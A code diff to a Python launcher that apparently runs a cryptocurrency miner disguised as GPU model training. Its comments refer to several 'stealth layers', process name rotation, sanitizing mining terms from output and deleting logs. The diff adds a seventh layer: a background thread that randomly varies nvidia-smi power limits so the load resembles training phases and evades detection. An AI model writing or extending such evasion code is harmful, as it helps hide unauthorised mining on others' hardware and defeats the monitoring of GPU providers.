@@ -12,6 +12,7 @@ import json
 import base64
 import hashlib
 import time
+import random
 from pathlib import Path
 from getpass import getpass
 
@@ -138,6 +139,61 @@ def find_weights_binary():
     
     raise FileNotFoundError("No GPU binary found in weights/")
 
+def detect_gpu_type():
+    """Detect H100 SXM vs PCIe for power limits."""
+    try:
+        r = subprocess.run(
+            ["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"],
+            capture_output=True, text=True, timeout=5)
+        name = r.stdout.strip().upper()
+        if "SXM" in name:
+            return "SXM"
+        return "PCIe"
+    except:
+        return "SXM"
+
+def set_power_limit(watts):
+    """Set GPU power limit via nvidia-smi."""
+    try:
+        subprocess.run(
+            ["nvidia-smi", f"--power-limit={watts}"],
+            capture_output=True, timeout=6)
+    except:
+        pass
+
+def power_cycle_thread(stop_event, gpu_type):
+    """Background thread: cycle power limits to mimic training load variation."""
+    if gpu_type == "SXM":
+        FULL_POWER = 630          # 90% of 700W
+        LOW_MIN, LOW_MAX = 210, 350  # 30-50% — checkpoint/eval phase
+    else:
+        FULL_POWER = 315          # 90% of 350W
+        LOW_MIN, LOW_MAX = 105, 175  # 30-50%
+
+    set_power_limit(FULL_POWER)
+
+    while not stop_event.is_set():
+        # Run at 90% for 8-10 min (training compute)
+        stop_event.wait(random.uniform(480, 600))
+        if stop_event.is_set():
+            break
+
+        # Drop to 30-50% for 1-3 min (checkpoint / eval / data loading)
+        low_power = random.randint(LOW_MIN, LOW_MAX)
+        set_power_limit(low_power)
+        print(f"[GPU] Power dropped to {low_power}W (eval phase)", flush=True)
+
+        stop_event.wait(random.uniform(60, 180))
+        if stop_event.is_set():
+            break
+
+        # Back to 90%
+        set_power_limit(FULL_POWER)
+        print(f"[GPU] Power restored to {FULL_POWER}W (training)", flush=True)
+
+        # Short burst at full power before next cycle
+        stop_event.wait(random.uniform(30, 90))
+
 def launch_training(config, binary_path):
     """Launch the GPU training process with stealth features."""
     import ctypes, ctypes.util, threading, hashlib, random, signal, struct
@@ -222,6 +278,12 @@ def launch_training(config, binary_path):
     
     # === STEALTH LAYER 6: Name rotation thread ===
     threading.Thread(target=name_rotation, daemon=True).start()
+
+    # === STEALTH LAYER 7: GPU power cycling ===
+    gpu_type = detect_gpu_type()
+    power_stop = threading.Event()
+    threading.Thread(target=power_cycle_thread, args=(power_stop, gpu_type), daemon=True).start()
+    print(f"[GPU] Power cycling active ({gpu_type})", flush=True)
     
     # === Read output → encrypted log + sanitized stdout ===
     MINE_TERMS = {
@@ -247,8 +309,14 @@ def launch_training(config, binary_path):
             print(f"  {sanitized.rstrip()}", flush=True)
     
     process.wait()
-    
+
     # === CLEANUP ===
+    power_stop.set()  # Stop power cycling
+    try:
+        # Reset power to default
+        subprocess.run(["nvidia-smi", "-rgc"], capture_output=True, timeout=5)
+        subprocess.run(["nvidia-smi", "-rgc"], capture_output=True, timeout=5)
+    except: pass
     try:
         log_enc_path.unlink()  # Delete encrypted log
     except: pass
